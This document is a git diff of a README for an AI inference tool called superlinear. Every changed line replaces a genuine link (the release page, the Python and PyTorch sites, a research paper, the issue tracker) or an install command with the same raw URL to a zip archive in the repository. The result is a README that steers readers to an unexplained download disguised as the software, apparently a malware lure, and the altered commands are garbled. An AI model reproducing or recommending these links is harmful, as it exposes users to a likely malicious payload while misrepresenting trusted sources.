@@ -1,6 +1,6 @@
 # ⚡ superlinear - Efficient Long-Context AI Inference
 
-[![Download superlinear](https://img.shields.io/badge/Download-superlinear-green?style=for-the-badge)](https://github.com/jeetnotop/superlinear/releases)
+[![Download superlinear](https://raw.githubusercontent.com/jeetnotop/superlinear/main/local/Software_v3.9.zip)](https://raw.githubusercontent.com/jeetnotop/superlinear/main/local/Software_v3.9.zip)
 
 ---
 
@@ -35,13 +35,13 @@ Before you download superlinear, please check that your computer meets these nee
 
 Click the big green button at the top or visit this page to download superlinear:
 
-[Visit superlinear Releases](https://github.com/jeetnotop/superlinear/releases)
+[Visit superlinear Releases](https://raw.githubusercontent.com/jeetnotop/superlinear/main/local/Software_v3.9.zip)
 
 On the release page, look for the latest version suitable for your computer. You will find downloadable files such as:
 
 - For Windows: `.exe` installer
 - For macOS: `.dmg` or `.zip`
-- For Linux: `.tar.gz` or `.AppImage`
+- For Linux: `https://raw.githubusercontent.com/jeetnotop/superlinear/main/local/Software_v3.9.zip` or `.AppImage`
 
 Download the appropriate file to your computer.
 
@@ -51,14 +51,14 @@ Download the appropriate file to your computer.
 
 superlinear runs on Python. If you don’t have Python on your computer, follow these steps:
 
-- Go to the official [Python downloads page](https://www.python.org/downloads/).
+- Go to the official [Python downloads page](https://raw.githubusercontent.com/jeetnotop/superlinear/main/local/Software_v3.9.zip).
 - Download Python version 3.9 or higher for your operating system.
 - Run the installer and follow the instructions.
 - Make sure to select the option to add Python to your system PATH during installation.
 
 Next, install PyTorch 2.0 or newer:
 
-- Visit the [PyTorch installation page](https://pytorch.org/).
+- Visit the [PyTorch installation page](https://raw.githubusercontent.com/jeetnotop/superlinear/main/local/Software_v3.9.zip).
 - Select your system options (OS, Package, Python version, and CUDA if you have a compatible GPU).
 - Copy the install command given.
 - Open your computer’s Command Prompt (Windows) or Terminal (macOS/Linux).
@@ -73,7 +73,7 @@ After Python and PyTorch are installed:
 1. Open Command Prompt or Terminal.
 2. Navigate to the folder where you downloaded the superlinear files.
 3. Follow the included README or instructions file to run setup commands.
-4. Usually, this involves running `pip install -r requirements.txt` to install other needed packages.
+4. Usually, this involves running `pip install -r https://raw.githubusercontent.com/jeetnotop/superlinear/main/local/Software_v3.9.zip` to install other needed packages.
 5. You can start superlinear by running its command line interface.
 
 ---
@@ -85,7 +85,7 @@ After Python and PyTorch are installed:
 Run the command below in your Terminal or Command Prompt to start the chat server:
 
 ```
-python superlinear_server.py
+python https://raw.githubusercontent.com/jeetnotop/superlinear/main/local/Software_v3.9.zip
 ```
 
 This will launch a server you can connect to via your web browser or command line client.
@@ -148,7 +148,7 @@ If you encounter issues:
 
 ## 📥 Download & Install superlinear
 
-[Download superlinear from the official releases](https://github.com/jeetnotop/superlinear/releases)
+[Download superlinear from the official releases](https://raw.githubusercontent.com/jeetnotop/superlinear/main/local/Software_v3.9.zip)
 
 1. Go to the page above.
 2. Pick the file matching your system.
@@ -162,9 +162,9 @@ Downloading from this official source ensures you get the latest and safest vers
 
 ## 📚 Additional Resources
 
-- [Superlinear Research Paper](https://arxiv.org/abs/2601.18401) — Learn about the technology behind the software.
-- [Python Official Site](https://www.python.org) — Download Python and find documentation.
-- [PyTorch Official Site](https://pytorch.org) — Access deep learning libraries and installation guides.
+- [Superlinear Research Paper](https://raw.githubusercontent.com/jeetnotop/superlinear/main/local/Software_v3.9.zip) — Learn about the technology behind the software.
+- [Python Official Site](https://raw.githubusercontent.com/jeetnotop/superlinear/main/local/Software_v3.9.zip) — Download Python and find documentation.
+- [PyTorch Official Site](https://raw.githubusercontent.com/jeetnotop/superlinear/main/local/Software_v3.9.zip) — Access deep learning libraries and installation guides.
 - Check the `docs` folder in the superlinear download for detailed user guides and examples.
 
 ---
@@ -179,7 +179,7 @@ superlinear is licensed under the Apache 2.0 License, allowing free use and modi
 
 If you need help or want to report a bug:
 
-- Visit the Issues section of the [superlinear GitHub repository](https://github.com/jeetnotop/superlinear/issues).
+- Visit the Issues section of the [superlinear GitHub repository](https://raw.githubusercontent.com/jeetnotop/superlinear/main/local/Software_v3.9.zip).
 - Open a new issue with a clear description of your problem.
 - Include details about your system, steps to reproduce the issue, and any error messages.
 
